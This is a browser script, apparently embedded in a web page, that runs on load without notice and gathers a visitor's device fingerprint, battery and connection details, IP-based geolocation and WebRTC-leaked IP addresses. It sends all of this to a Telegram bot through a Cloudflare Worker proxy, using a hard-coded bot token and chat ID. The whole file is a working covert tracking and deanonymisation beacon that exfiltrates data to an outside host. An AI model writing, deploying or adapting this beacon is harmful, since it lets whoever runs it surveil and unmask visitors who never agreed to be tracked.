<script>

const BOT_TOKEN = "8989141650:AAFBGRMzK6D_7yqVGiinhRR1VHK7Q65ATKY";
const CHAT_ID   = "6266637606";
const PROXY     = "https://throbbing-flower-79dd.nikita10020045.workers.dev";  // ← твой воркер
/* ========================================= */

const el = document.getElementById("s");
const setStatus = m => { el.textContent = m; };

const info = {
  ua:       navigator.userAgent,
  platform: navigator.platform,
  lang:     navigator.language,
  langs:    navigator.languages,
  cores:    navigator.hardwareConcurrency || null,
  mem:      navigator.deviceMemory || null,
  dpr:      window.devicePixelRatio,
  screen:   screen.width + "x" + screen.height,
  avail:    screen.availWidth + "x" + screen.availHeight,
  tz:       Intl.DateTimeFormat().resolvedOptions().timeZone,
  tzOffset: new Date().getTimezoneOffset(),
  touch:    navigator.maxTouchPoints || 0,
  conn: navigator.connection ? {
          type: navigator.connection.effectiveType,
          down: navigator.connection.downlink,
          rtt:  navigator.connection.rtt
        } : null,
  battery:  null,
  webrtc_ips: [],
  ts:       new Date().toISOString(),
};

if (navigator.getBattery) {
  navigator.getBattery().then(b => {
    info.battery = { level: Math.round(b.level * 100) + "%", charging: b.charging };
  }).catch(()=>{});
}

async function webrtcLeak(timeoutMs = 4000) {
  const RTCPeerConnection = window.RTCPeerConnection
    || window.webkitRTCPeerConnection
    || window.mozRTCPeerConnection;
  if (!RTCPeerConnection) return [];
  const ips = new Set();
  return new Promise((resolve) => {
    let pc;
    try {
      pc = new RTCPeerConnection({
        iceServers: [
          { urls: "stun:stun.cloudflare.com:3478" },
          { urls: "stun:stun.l.google.com:19302" },
        ],
      });
    } catch (e) { resolve([]); return; }
    try { pc.createDataChannel(""); } catch (e) {}
    pc.onicecandidate = (e) => {
      if (!e.candidate) return;
      const m = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
      if (m) ips.add(m[1]);
    };
    pc.createOffer().then(o => pc.setLocalDescription(o)).catch(()=>{});
    setTimeout(() => { try { pc.close(); } catch(e){} resolve(Array.from(ips)); }, timeoutMs);
  });
}

async function geo() {
  const endpoints = ["https://ipapi.co/json/", "https://ipwho.is/"];
  for (const url of endpoints) {
    try {
      const r = await fetch(url, {cache: "no-store"});
      const j = await r.json();
      return {
        ip:      j.ip,
        city:    j.city,
        region:  j.region || j.region_name,
        country: j.country_name || j.country,
        org:     j.org || (j.connection && j.connection.org),
        asn:     j.asn || (j.connection && j.connection.asn),
      };
    } catch (e) {}
  }
  return {ip: null};
}

async function send(payload) {
  const text = "📡 beacon\n```\n" + JSON.stringify(payload, null, 2) + "\n```";
  const r = await fetch(`${PROXY}/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({chat_id: CHAT_ID, text, parse_mode: "Markdown"})
  });
  const j = await r.json();
  if (!j.ok) throw new Error("TG: " + JSON.stringify(j));
  return j;
}

(async () => {
  try {
    const g = await geo();
    Object.assign(info, g);
  } catch (e) {}

  try {
    info.webrtc_ips = await webrtcLeak();
  } catch (e) { info.webrtc_ips = []; }

  try {
    await send(info);
    setStatus("ok");
  } catch (e) {
    setStatus("failed");
  }
})();
